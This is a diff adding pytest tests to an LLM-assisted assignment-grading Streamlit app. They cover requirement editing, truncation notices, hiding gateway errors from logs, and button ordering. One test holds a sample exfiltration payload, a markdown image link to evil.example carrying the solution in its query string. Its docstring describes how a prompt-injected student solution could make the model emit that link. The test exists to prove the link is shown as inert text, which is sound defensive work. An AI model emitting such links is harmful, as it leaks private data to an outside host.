@@ -255,3 +255,100 @@ def test_earlier_results_with_another_checklist_are_called_out():
     page.at.session_state["grading_results_by_key"] = {"k": [("a", object()), ("b", object())]}
     page.run()
     assert "2 earlier results used a different checklist; regrade for a consistent section." in page.captions
+
+
+GRADED_BOX = "Requirements to grade (remove one to stop grading it)"
+
+
+def _edit(page, edits):
+    key = rc.instructions_hash("source-1")
+    editor_key = f"requirements_editor_{key[:12]}_{page.at.session_state['requirement_editor_generation'][key]}"
+    page.at.session_state[editor_key] = edits
+    return {editor_key: edits}
+
+
+def test_model_text_is_not_rendered_as_markdown():
+    """A prompt-injected solution can make the model answer with an image link that the browser
+    would fetch. Evidence and requirement text are shown inert."""
+    evil = "![x](http://evil.example/a.png?q=SOLUTION)"
+    answer = rsc.SolutionCheck(verdicts=[
+        rsc.SolutionVerdict(requirement_id="R1", does_it="yes", evidence="ok"),
+        rsc.SolutionVerdict(requirement_id="R2", does_it="no", evidence=evil),
+        rsc.SolutionVerdict(requirement_id="R3", does_it="yes", evidence="ok")])
+    page = Page(check=AsyncMock(return_value=answer), calibrated=False)
+    page.at.session_state["solution_text"] = SOLUTION
+    page.run()
+    shown = [c for c in page.captions if c.startswith("R2:")]
+    assert shown and all("![" not in c and "](" not in c for c in shown)
+    assert not page.at.get("imgs")
+
+
+def test_no_instruction_names_a_graded_column_or_tick_box():
+    import inspect
+
+    from cqc_streamlit_app import grade_assignment as ga
+
+    source = inspect.getsource(ga._render_solution_check) + ga.TABLE_HELP + ga.SOLUTION_CHECK_FAILED
+    assert "untick" not in source.lower() and "tick graded" not in source.lower()
+    assert "Requirements to grade" in ga.TABLE_HELP and "Requirements to grade" in ga.SOLUTION_CHECK_FAILED
+
+
+def test_a_removed_requirement_stays_removed_when_another_row_is_edited_or_added():
+    page = Page()
+    page.at.session_state["solution_text"] = SOLUTION
+    page.run()
+    next(m for m in page.at.multiselect if m.label == GRADED_BOX).set_value(["R1", "R3"]).run()
+    assert [r.graded for r in page.out.requirements] == [True, False, True]
+    assert [r.hand_ungraded for r in page.out.requirements] == [False, True, False]
+
+    _edit(page, {"edited_rows": {0: {"text": "Reads a price and a quantity"}},
+                 "added_rows": [], "deleted_rows": []})
+    page.run()
+    assert [r.graded for r in page.out.requirements] == [True, False, True]
+    assert page.out.requirements[0].text == "Reads a price and a quantity"
+
+    _edit(page, {"edited_rows": {}, "added_rows": [{"text": "Prints a banner", "weight": "core"}],
+                 "deleted_rows": []})
+    page.run()
+    assert [r.id for r in page.out.requirements] == ["R1", "R2", "R3", "R4"]
+    assert [r.graded for r in page.out.requirements] == [True, False, True, True]
+    assert page.out.requirements[0].text == "Reads a price"
+
+
+def test_a_requirement_the_instructor_removed_is_not_put_back_by_a_recheck():
+    page = Page()  # not calibrated: the "no" for R2 is only a suggestion
+    page.at.session_state["solution_text"] = SOLUTION
+    page.run()
+    next(m for m in page.at.multiselect if m.label == GRADED_BOX).set_value(["R1", "R3"]).run()
+    page.check.return_value = _verdicts(r1="yes", r2="yes", r3="yes")
+    page.click("Check all against the solution")
+    assert [r.solution_status for r in page.out.requirements] == ["yes", "yes", "yes"]
+    assert [r.graded for r in page.out.requirements] == [True, False, True]
+
+
+def test_a_long_instruction_text_says_the_check_read_only_the_start():
+    page = Page()
+    page.at.session_state["solution_text"] = SOLUTION
+    with patch.object(rsc, "MAX_INSTRUCTIONS_CHARS", 20):
+        page.run()
+    assert "The check read only the first 20 characters of the instructions." in page.captions
+
+
+def test_a_gateway_error_never_reaches_the_log_or_the_page(caplog):
+    real = rsc.check_requirements_against_solution
+    page = Page(check=real)
+    page.at.session_state["solution_text"] = SOLUTION
+    with patch("cqc_cpcc.utilities.AI.llm_gateway.structured",
+               new=AsyncMock(side_effect=Exception("SECRET_FROM_GATEWAY"))), caplog.at_level("DEBUG"):
+        page.run()
+    shown = " ".join([w.value for w in page.at.warning] + page.captions)
+    assert "SECRET_FROM_GATEWAY" not in shown and "SECRET_FROM_GATEWAY" not in caplog.text
+    assert any(w.value == SOLUTION_CHECK_FAILED for w in page.at.warning)
+
+
+def test_the_reason_a_button_is_off_comes_before_the_button():
+    page = Page().run()
+    flat = " ".join(e.label if e.type == "button" else e.value for e in page.at.main
+                     if e.type in ("button", "caption"))
+    assert flat.index("The next button is off because there is no solution yet.") < flat.index(
+        "Check all against the solution")
